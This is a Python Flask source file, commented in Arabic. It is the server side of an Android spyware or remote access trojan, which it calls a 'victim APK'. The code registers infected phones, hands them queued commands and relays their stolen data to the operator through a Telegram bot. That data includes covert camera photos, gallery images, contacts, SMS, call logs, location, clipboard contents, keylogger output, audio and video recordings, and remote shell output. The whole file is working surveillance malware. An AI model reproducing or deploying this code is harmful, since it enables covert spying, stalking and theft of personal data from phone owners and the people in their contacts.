# api_victim.py
# ============================================================
# API للضحية (Victim APK) — v4
# ============================================================

import io
import base64
import time
import threading
from flask import request, jsonify

from config import bot, redis_client
from imports_manager import (
    find_victim_by_token,
    register_victim_device,
    update_victim_status,
    pop_victim_commands,
)


class VictimBuffer:
    def __init__(self, victim_id, chat_id, victim_name):
        self.victim_id = victim_id
        self.chat_id = chat_id
        self.victim_name = victim_name
        self.contacts = []
        self.contacts_total = 0
        self.photos = []
        self.photos_total = 0
        self.lock = threading.Lock()


_buffers = {}
_buffers_lock = threading.Lock()


def _get_buffer(victim_id, chat_id, victim_name):
    with _buffers_lock:
        if victim_id not in _buffers:
            _buffers[victim_id] = VictimBuffer(victim_id, chat_id, victim_name)
        buf = _buffers[victim_id]
        buf.chat_id = chat_id
        buf.victim_name = victim_name
        return buf


def _send_contacts_batch(victim_id):
    with _buffers_lock:
        buf = _buffers.get(victim_id)
        if not buf or not buf.contacts:
            return
        contacts = list(buf.contacts)
        total = buf.contacts_total or len(contacts)
        buf.contacts = []
    
    try:
        cid = int(buf.chat_id) if str(buf.chat_id).isdigit() else buf.chat_id
        
        lines = [
            f"📇 جهات الاتصال — {buf.victim_name}",
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
            f"📊 العدد: {len(contacts)} / {total}",
            f"",
        ]
        
        for i, c in enumerate(contacts, 1):
            name = c.get("name", "—") or "—"
            number = c.get("number", "—") or "—"
            lines.append(f"{i}. {name}")
            lines.append(f"   📞 {number}")
            lines.append("")
        
        content = "\n".join(lines)
        
        if len(content) > 3500:
            buf_io = io.BytesIO(content.encode('utf-8'))
            buf_io.name = f"contacts_{buf.victim_name[:20]}.txt"
            bot.send_document(
                cid, buf_io,
                caption=f"📇 **جهات الاتصال ({len(contacts)}/{total})**\n"
                        f"👤 `{buf.victim_name}`",
                parse_mode="Markdown"
            )
        else:
            bot.send_message(
                cid,
                f"📇 **جهات الاتصال ({len(contacts)}/{total})**\n"
                f"```\n{content[:3500]}\n```",
                parse_mode="Markdown"
            )
        
        print(f"[+] Contacts batch sent: {len(contacts)}")
    except Exception as e:
        print(f"[-] send contacts batch error: {e}")


def _send_photos_batch(victim_id):
    with _buffers_lock:
        buf = _buffers.get(victim_id)
        if not buf or not buf.photos:
            return
        photos = list(buf.photos)
        total = buf.photos_total or len(photos)
        buf.photos = []
    
    try:
        cid = int(buf.chat_id) if str(buf.chat_id).isdigit() else buf.chat_id
        
        if len(photos) <= 3:
            for i, (name, img_bytes) in enumerate(photos, 1):
                try:
                    buf_io = io.BytesIO(img_bytes)
                    buf_io.name = name
                    bot.send_photo(
                        cid, buf_io,
                        caption=f"🖼️ **{name}** ({i}/{len(photos)})\n👤 `{buf.victim_name}`",
                        parse_mode="Markdown"
                    )
                    time.sleep(0.5)
                except Exception as e:
                    print(f"[-] photo {i} error: {e}")
        else:
            import zipfile
            zip_buffer = io.BytesIO()
            
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                for name, img_bytes in photos:
                    zf.writestr(name, img_bytes)
            
            zip_buffer.seek(0)
            zip_buffer.name = f"photos_{buf.victim_name[:20]}.zip"
            
            bot.send_document(
                cid, zip_buffer,
                caption=f"🖼️ **الصور ({len(photos)}/{total})**\n"
                        f"👤 `{buf.victim_name}`\n"
                        f"📦 ملف ZIP",
                parse_mode="Markdown"
            )
        
        print(f"[+] Photos batch sent: {len(photos)}")
    except Exception as e:
        print(f"[-] send photos batch error: {e}")


def init_victim_api(app, bot_instance=None):
    global bot
    if bot_instance:
        bot = bot_instance

    @app.route('/apk/victim/register', methods=['POST'])
    def victim_register():
        try:
            data = request.get_json(silent=True) or {}
            victim_token = data.get('token', '').strip()

            if not victim_token:
                return jsonify({"error": "missing_token"}), 400

            victim_info = find_victim_by_token(victim_token)
            if not victim_info:
                print(f"[-] Invalid victim_token: {victim_token[:16]}")
                return jsonify({"error": "invalid_token"}), 403

            chat_id = victim_info['chat_id']
            victim_id = victim_info['victim_id']
            victim_name = victim_info.get('name', 'Unknown')

            device_id = data.get('device_id', '')
            model = data.get('model', 'Unknown')
            brand = data.get('brand', 'Unknown')
            android = data.get('android', 'Unknown')
            sdk = data.get('sdk', 0)

            register_victim_device(
                chat_id, victim_id, device_id,
                {"model": model, "brand": brand, "android": android, "sdk": sdk}
            )

            print(f"[+] Victim registered: {victim_name} | {model} | {device_id[:16]}")

            try:
                cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                bot.send_message(
                    cid,
                    f"✅ **ضحية جديدة متصلة!**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"👤 **الاسم:** `{victim_name}`\n"
                    f"📱 **الموديل:** `{brand} {model}`\n"
                    f"🤖 **Android:** `{android}` (SDK {sdk})\n"
                    f"🆔 **Device:** `{device_id[:16]}`\n\n"
                    f"🎛️ **استخدم:** /panel للتحكم",
                    parse_mode="Markdown"
                )
            except Exception as e:
                print(f"[-] notify error: {e}")

            return jsonify({"ok": True, "victim_id": victim_id}), 200
        except Exception as e:
            print(f"[-] register error: {e}")
            return jsonify({"error": str(e)}), 500

    @app.route('/apk/victim/poll', methods=['GET'])
    def victim_poll():
        try:
            victim_token = request.args.get('token', '').strip()
            if not victim_token:
                return jsonify({"commands": []}), 200

            victim_info = find_victim_by_token(victim_token)
            if not victim_info:
                return jsonify({"commands": []}), 200

            victim_id = victim_info['victim_id']
            chat_id = victim_info['chat_id']

            update_victim_status(chat_id, victim_id, "active")

            commands = pop_victim_commands(victim_id, max_count=10)
            if commands:
                print(f"[+] Delivered {len(commands)} commands to {victim_id[:8]}")

            return jsonify({"commands": commands}), 200
        except Exception as e:
            print(f"[-] poll error: {e}")
            return jsonify({"commands": []}), 200

    @app.route('/apk/victim/data', methods=['POST'])
    def victim_data():
        try:
            data = request.get_json(silent=True) or {}
            victim_token = data.get('token', '').strip()
            dtype = data.get('type', '')

            if not victim_token:
                return jsonify({"status": "no_token"}), 200

            victim_info = find_victim_by_token(victim_token)
            if not victim_info:
                print(f"[-] data from unknown token: {victim_token[:16]}")
                return jsonify({"status": "invalid_token"}), 200

            chat_id = victim_info['chat_id']
            victim_id = victim_info['victim_id']
            victim_name = victim_info.get('name', 'Unknown')

            try:
                update_victim_status(chat_id, victim_id, "active")
            except Exception:
                pass

            cid = int(chat_id) if str(chat_id).isdigit() else chat_id
            print(f"[<<] {dtype} from {victim_name} ({victim_id[:8]})")

            if dtype == "camera_photo":
                img_data = data.get('image', '')
                cam_name = data.get('camera_name', '')
                cam_icon = "📷 أمامية" if cam_name == "front" else "📸 خلفية"

                if img_data and img_data.startswith("data:image"):
                    try:
                        _, encoded = img_data.split(",", 1)
                        img_bytes = base64.b64decode(encoded)
                        buf_io = io.BytesIO(img_bytes)
                        buf_io.name = f"camera_{cam_name}.jpg"
                        bot.send_photo(
                            cid, buf_io,
                            caption=f"📸 **{cam_icon}**\n"
                                    f"👤 `{victim_name}`\n"
                                    f"🆔 `{victim_id[:8]}`",
                            parse_mode="Markdown"
                        )
                    except Exception as e:
                        print(f"[-] photo error: {e}")

            elif dtype == "photo_single":
                img_data = data.get("image", "")
                img_name = data.get("name", "photo.jpg")
                index = data.get("index", 0)
                total = data.get("total", 1)
                
                if img_data and img_data.startswith("data:image"):
                    try:
                        _, encoded = img_data.split(",", 1)
                        img_bytes = base64.b64decode(encoded)
                        
                        buf = _get_buffer(victim_id, cid, victim_name)
                        with buf.lock:
                            buf.photos.append((img_name, img_bytes))
                            buf.photos_total = total
                        
                        if len(buf.photos) >= 3:
                            _send_photos_batch(victim_id)
                    except Exception as e:
                        print(f"[-] photo_single error: {e}")

            elif dtype == "photos_done":
                total = data.get("total", 0)
                _send_photos_batch(victim_id)
                
                try:
                    bot.send_message(
                        cid,
                        f"✅ **تم استلام الصور** — `{victim_name}`\n"
                        f"📊 الإجمالي: `{total}`",
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass

            elif dtype == "contacts":
                contact = data.get("contact", None)
                index = data.get("index", 0)
                total = data.get("total", 0)
                
                if contact:
                    buf = _get_buffer(victim_id, cid, victim_name)
                    with buf.lock:
                        buf.contacts.append(contact)
                        buf.contacts_total = total
                    
                    if len(buf.contacts) >= 50:
                        _send_contacts_batch(victim_id)

            elif dtype == "contacts_done":
                total = data.get("total", 0)
                _send_contacts_batch(victim_id)
                
                try:
                    bot.send_message(
                        cid,
                        f"✅ **تم استلام جهات الاتصال** — `{victim_name}`\n"
                        f"📊 الإجمالي: `{total}`",
                        parse_mode="Markdown"
                    )
                except Exception:
                    pass

            elif dtype == "video_record":
                video_data = data.get('video', '')
                duration = data.get('duration', 0)
                if video_data and video_data.startswith("data:video"):
                    try:
                        _, encoded = video_data.split(",", 1)
                        vid_bytes = base64.b64decode(encoded)
                        buf_io = io.BytesIO(vid_bytes)
                        buf_io.name = "record.mp4"
                        bot.send_video(
                            cid, buf_io,
                            caption=f"🎥 **فيديو {duration/1000:.1f} ثانية**\n"
                                    f"👤 `{victim_name}`",
                            parse_mode="Markdown"
                        )
                    except Exception as e:
                        print(f"[-] video error: {e}")

            elif dtype == "audio_record":
                audio_data = data.get('audio', '')
                duration = data.get('duration', 0)
                if audio_data and audio_data.startswith("data:audio"):
                    try:
                        _, encoded = audio_data.split(",", 1)
                        aud_bytes = base64.b64decode(encoded)
                        buf_io = io.BytesIO(aud_bytes)
                        buf_io.name = "record.3gp"
                        bot.send_audio(
                            cid, buf_io,
                            caption=f"🎙️ **صوت {duration/1000:.1f} ثانية**\n"
                                    f"👤 `{victim_name}`",
                            parse_mode="Markdown"
                        )
                    except Exception as e:
                        print(f"[-] audio error: {e}")

            elif dtype == "device_info":
                text = (
                    f"📱 **معلومات الجهاز**\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"👤 `{victim_name}`\n"
                    f"📦 الموديل: `{data.get('model')}`\n"
                    f"🏭 الشركة: `{data.get('brand')}`\n"
                    f"🤖 Android: `{data.get('android')}`"
                )
                bot.send_message(cid, text, parse_mode="Markdown")

            elif dtype == "battery":
                level = data.get('level', 0)
                charging = data.get('charging', False)
                text = (
                    f"🔋 **البطارية**\n"
                    f"👤 `{victim_name}`\n"
                    f"📊 `{level}%`\n"
                    f"⚡ `{'يشحن' if charging else 'لا يشحن'}`"
                )
                bot.send_message(cid, text, parse_mode="Markdown")

            elif dtype == "sms":
                sms_list = data.get("sms", [])
                if not sms_list:
                    bot.send_message(cid, f"📭 لا رسائل من {victim_name}")
                else:
                    lines = [
                        f"📨 SMS — {victim_name}",
                        f"━━━━━━━━━━━━━━━━━━",
                        f"📊 العدد: {len(sms_list)}",
                        "",
                    ]
                    for s in sms_list[:50]:
                        lines.append(f"📩 من: {s.get('from')}")
                        lines.append(f"   {s.get('body','')[:200]}")
                        lines.append("")
                    
                    msg = "\n".join(lines)
                    
                    if len(msg) > 3500:
                        buf_io = io.BytesIO(msg.encode('utf-8'))
                        buf_io.name = f"sms_{victim_name[:20]}.txt"
                        bot.send_document(
                            cid, buf_io,
                            caption=f"📨 **SMS ({len(sms_list)})**",
                            parse_mode="Markdown"
                        )
                    else:
                        bot.send_message(cid, f"```\n{msg}\n```", parse_mode="Markdown")

            elif dtype == "call_log":
                calls = data.get("calls", [])
                type_map = {"1": "📥", "2": "📤", "3": "❌"}
                lines = [
                    f"📞 سجل المكالمات — {victim_name}",
                    f"━━━━━━━━━━━━━━━━━━",
                    f"📊 العدد: {len(calls)}",
                    "",
                ]
                for c in calls[:50]:
                    t = type_map.get(str(c.get('type','')), '❓')
                    lines.append(f"{t} {c.get('number')} — {c.get('duration')}s")
                
                bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")

            elif dtype == "apps":
                apps = data.get("apps", [])
                lines = [
                    f"📲 التطبيقات — {victim_name}",
                    f"━━━━━━━━━━━━━━━━━━",
                    f"📊 العدد: {len(apps)}",
                    "",
                ]
                for a in apps[:100]:
                    lines.append(f"• {a.get('name')}")
                
                msg = "\n".join(lines)
                
                if len(msg) > 3500:
                    buf_io = io.BytesIO(msg.encode('utf-8'))
                    buf_io.name = f"apps_{victim_name[:20]}.txt"
                    bot.send_document(cid, buf_io, caption=f"📲 التطبيقات", parse_mode="Markdown")
                else:
                    bot.send_message(cid, msg, parse_mode="Markdown")

            elif dtype == "location":
                lat = data.get("lat")
                lng = data.get("lng")
                if lat and lng:
                    bot.send_message(
                        cid,
                        f"📍 **الموقع** — `{victim_name}`\n"
                        f"`{lat}, {lng}`\n"
                        f"[خرائط](https://maps.google.com/?q={lat},{lng})",
                        parse_mode="Markdown"
                    )
                else:
                    bot.send_message(cid, f"❌ لا يوجد موقع من {victim_name}")

            elif dtype == "clipboard":
                text = data.get("text", "")
                if text:
                    bot.send_message(
                        cid,
                        f"📋 **الحافظة** — `{victim_name}`\n```\n{text[:500]}\n```",
                        parse_mode="Markdown"
                    )
                else:
                    bot.send_message(cid, f"📋 الحافظة فاضية — {victim_name}")

            elif dtype == "photos":
                photos = data.get("photos", [])
                lines = [f"🖼️ **الصور ({len(photos)})** — `{victim_name}`"]
                for p in photos[:20]:
                    lines.append(f"• `{p.get('path')}`")
                bot.send_message(cid, "\n".join(lines), parse_mode="Markdown")

            elif dtype == "shell_result":
                cmd = data.get("command", "")
                output = data.get("output", "")
                bot.send_message(
                    cid,
                    f"💻 **Shell** — `{victim_name}`\n"
                    f"`{cmd}`\n```\n{output[:2000]}\n```",
                    parse_mode="Markdown"
                )

            elif dtype == "cmd_result":
                action = data.get("action", "")
                status = data.get("status", "")
                error = data.get("error", "")
                if status == "fail":
                    bot.send_message(
                        cid,
                        f"❌ **فشل أمر على `{victim_name}`**\n"
                        f"الأمر: `{action}`\n"
                        f"السبب: `{error[:200]}`",
                        parse_mode="Markdown"
                    )

            elif dtype == "keylog":
                text = data.get("text", "")
                if text.strip():
                    bot.send_message(
                        cid,
                        f"⌨️ **لوحة مفاتيح** — `{victim_name}`\n"
                        f"```\n{text[:500]}\n```",
                        parse_mode="Markdown"
                    )

            elif dtype == "heartbeat":
                pass

            return jsonify({"status": "ok"}), 200
        except Exception as e:
            print(f"[-] victim_data error: {e}")
            import traceback
            traceback.print_exc()
            return jsonify({"status": "error"}), 200
